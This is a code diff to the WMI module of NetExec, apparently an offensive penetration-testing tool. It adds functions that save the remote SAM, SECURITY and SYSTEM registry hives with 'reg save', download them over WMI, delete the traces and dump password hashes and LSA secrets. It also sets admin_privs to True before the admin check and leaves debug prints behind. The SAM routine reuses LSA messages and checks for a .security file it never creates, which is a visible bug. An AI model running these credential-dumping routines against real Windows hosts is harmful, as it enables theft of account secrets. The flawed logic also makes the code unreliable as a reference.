@@ -1,6 +1,8 @@
 import os
 from io import StringIO
+import struct
 
+from nxc.helpers.misc import gen_random_string
 from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.config import process_secret
 from nxc.connection import connection, dcom_FirewallChecker, requires_admin
@@ -14,7 +16,8 @@ from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5 import transport, epm
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, MSRPC_BIND, MSRPCBind, CtxItem, MSRPCHeader, SEC_TRAILER, MSRPCBindAck
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
-from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, IWbemLevel1Login
+from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, DCERPCSessionError, IID_IWbemLevel1Login, IWbemLevel1Login
+from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
 
 MSRPC_UUID_PORTMAP = uuidtup_to_bin(("E1AF8308-5D1F-11C9-91A4-08002B14A0FA", "3.0"))
 
@@ -156,6 +159,7 @@ class wmi(connection):
     def check_if_admin(self):
         try:
             self.dcom_conn = DCOMConnection(self.remoteName, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True, doKerberos=self.doKerberos, kdcHost=self.kdcHost, aesKey=self.aesKey, remoteHost=self.host)
+            self.admin_privs = True
             iInterface = self.dcom_conn.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
             flag, self.stringBinding = dcom_FirewallChecker(iInterface, self.host, self.args.rpc_timeout)
         except Exception as e:
@@ -484,3 +488,105 @@ class wmi(connection):
             return output
         else:
             return output
+
+    # Borrowed from dploot
+    def get_file(self, remote_path, local_path):
+        escaped_path = remote_path.replace("\\", "\\\\")
+        object_path = f'PS_ModuleFile.InstanceID="{escaped_path}"'
+
+        self.logger.debug(f"Downloading file from {remote_path} to {local_path}")
+        try:
+            namespace = self.iWbemLevel1Login.NTLMLogin("//./root/Microsoft/Windows/Powershellv3", NULL, NULL)
+            self.iWbemLevel1Login.RemRelease()
+            iWbemClassObject, _ = namespace.GetObject(object_path)
+        except DCERPCSessionError as e:
+            if e.error_code == 0x80041002:
+                self.logger.debug(f"Cannot find {remote_path} file")
+            return
+
+        obj = iWbemClassObject.getProperties()
+
+        file_data = None
+        for prop_name, prop_value in obj.items():
+            if prop_name == "FileData":
+                file_data = prop_value["value"]
+                break
+
+        if len(file_data) < 4:
+            self.logger.debug(f"File {remote_path} is empty or too small to read")
+            return
+
+        file_length = struct.unpack(">I", bytes(file_data[0:4]))[0]
+        file_content = bytes(file_data[4:4 + file_length])
+        self.logger.debug(f"Read {file_length} bytes from {remote_path}")
+
+        print(f"Length: {file_length}")
+
+        with open(local_path, "wb") as f:
+            f.write(file_content)
+        self.logger.debug(f"Saved file to {local_path}")
+
+    def sam(self):
+        sam_storename = gen_random_string(6)
+        system_storename = gen_random_string(6)
+        dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
+        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="sam")
+        try:
+            self.execute(dump_command)
+            self.get_file(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam")
+            print("HERE")
+            self.get_file(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system")
+            print("HERE2")
+            self.execute(clean_command)
+        except Exception as e:
+            self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
+            self.logger.debug(f"Error dumping LSA: {e}", exc_info=True)
+        else:
+            if not (os.path.exists(f"{output_filename}.security") and os.path.getsize(f"{output_filename}.security") > 0) \
+                    or not (os.path.exists(f"{output_filename}.system") and os.path.getsize(f"{output_filename}.system") > 0):
+                self.logger.fail("SECURITY or SYSTEM hive could not be dumped, privs may not be sufficient.")
+                return
+            self.logger.display("Dumping SAM hashes")
+            local_operations = LocalOperations(f"{output_filename}.system")
+            boot_key = local_operations.getBootKey()
+            SAM = SAMHashes(
+                f"{output_filename}.sam",
+                boot_key,
+                isRemote=None,
+                perSecretCallback=lambda secret: self.logger.highlight(secret),
+            )
+            SAM.dump()
+            SAM.export(output_filename)
+
+    def lsa(self):
+        security_storename = gen_random_string(6)
+        system_storename = gen_random_string(6)
+        dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
+        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="lsa")
+        try:
+            self.execute(dump_command)
+            self.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
+            self.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            self.execute(clean_command)
+        except Exception as e:
+            self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
+            self.logger.debug(f"Error dumping LSA: {e}", exc_info=True)
+        else:
+            if not (os.path.exists(f"{output_filename}.security") and os.path.getsize(f"{output_filename}.security") > 0) \
+                    or not (os.path.exists(f"{output_filename}.system") and os.path.getsize(f"{output_filename}.system") > 0):
+                self.logger.fail("SECURITY or SYSTEM hive could not be dumped, privs may not be sufficient.")
+                return
+            self.logger.display("Dumping LSA secrets")
+            local_operations = LocalOperations(f"{output_filename}.system")
+            boot_key = local_operations.getBootKey()
+            LSA = LSASecrets(
+                f"{output_filename}.security",
+                boot_key,
+                None,
+                isRemote=None,
+                perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
+            )
+            LSA.dumpCachedHashes()
+            LSA.dumpSecrets()
